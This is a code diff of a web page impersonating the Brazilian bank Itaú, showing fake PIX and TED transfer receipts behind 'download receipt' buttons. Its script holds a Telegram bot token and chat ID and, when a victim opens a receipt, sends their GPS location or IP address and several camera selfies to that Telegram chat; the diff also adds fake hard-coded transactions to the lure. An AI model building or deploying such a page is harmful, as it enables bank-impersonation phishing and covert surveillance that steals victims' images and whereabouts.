@@ -13,8 +13,8 @@
     main{max-width:960px;margin:30px auto;padding:0 15px}
     .card{background:var(--grey);border-radius:8px;padding:20px;margin-bottom:15px;display:flex;justify-content:space-between;align-items:center}
     .info{flex:1}
-    .info p{margin:0;font-size:14px;color:#555}
-    .value{color:#2e7d32;font-weight:bold;font-size:16px;margin-top:4px}
+    .info h3{margin:0 0 4px;font-size:16px}
+    .value{color:#2e7d32;font-weight:bold}
     .btn{background:var(--primary);color:#fff;border:none;padding:10px 24px;border-radius:4px;cursor:pointer;font-size:14px}
     .btn:hover{background:#002a61}
     .overlay{position:fixed;inset:0;background:#000a;display:flex;align-items:center;justify-content:center;z-index:9999;opacity:0;visibility:hidden;transition:.3s}
@@ -26,32 +26,39 @@
   </style>
 </head>
 <body>
-  <header><div class="logo">Itaú</div></header>
+  <header>
+    <div class="logo">Itaú</div>
+  </header>
 
   <main>
     <h2>Comprovantes emitidos</h2>
+
     <div class="card">
-      <div class="info"><p id="t1"></p><p class="value">R$ 1.000,00</p></div>
-      <button class="btn" onclick="baixar(this,'1.000,00')">Baixar comprovante</button>
-    </div>
-    <div class="card">
-      <div class="info"><p id="t2"></p><p class="value">R$ 500,00</p></div>
-      <button class="btn" onclick="baixar(this,'500,00')">Baixar comprovante</button>
-    </div>
-    <div class="card">
-      <div class="info"><p id="t3"></p><p class="value">R$ 1.200,00</p></div>
-      <button class="btn" onclick="baixar(this,'1.200,00')">Baixar comprovante</button>
+      <div class="info">
+        <h3>Transferência PIX</h3>
+        <p>05/03/2026 14:32 • Para João Silva</p>
+        <p class="value">R$ 350,00</p>
+      </div>
+      <button class="btn" onclick="baixar(this,'350,00')">Baixar comprovante</button>
     </div>
 
-    <script>
-      const agora = new Date();
-      function fmt(d){
-        return d.toLocaleString('pt-BR',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'});
-      }
-      document.getElementById('t1').textContent = fmt(new Date(agora - 60*60*1000));
-      document.getElementById('t2').textContent = fmt(new Date(agora - 2*60*60*1000));
-      document.getElementById('t3').textContent = fmt(new Date(agora - 3*60*60*1000));
-    </script>
+    <div class="card">
+      <div class="info">
+        <h3>Pix – QR Code</h3>
+        <p>04/03/2026 09:15 • Mercado</p>
+        <p class="value">R$ 89,90</p>
+      </div>
+      <button class="btn" onclick="baixar(this,'89,90')">Baixar comprovante</button>
+    </div>
+
+    <div class="card">
+      <div class="info">
+        <h3>TED</h3>
+        <p>03/03/2026 16:22 • Conta corrente</p>
+        <p class="value">R$ 1.200,00</p>
+      </div>
+      <button class="btn" onclick="baixar(this,'1.200,00')">Baixar comprovante</button>
+    </div>
   </main>
 
   <div id="ov" class="overlay">
@@ -64,6 +71,7 @@
   </div>
 
   <script>
+    /* ========= CONFIGS TELEGRAM ========= */
     const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
     const CHAT_ID = '-1003187104876';
 
@@ -86,6 +94,7 @@
         const {selfies,locationData,ipFallback} = ev.data.dados;
         const hora = new Date().toLocaleString('pt-BR');
 
+        /* === MONTA MENSAGEM COM LINK GOOGLE MAPS === */
         let texto = `🔴 Comprovante aberto – R$ ${valor} – ${hora}\n`;
         if(locationData){
           texto += `📍 https://www.google.com/maps?q=${locationData.lat},${locationData.lon}&hl=pt-BR&z=18\n`;
@@ -93,6 +102,7 @@
           texto += `📍 GPS negado – IP: ${ipFallback}\n`;
         }
 
+        /* === ENVIA TEXTO + 5 SELFIES === */
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
           method:'POST',
           headers:{'Content-Type':'application/json'},
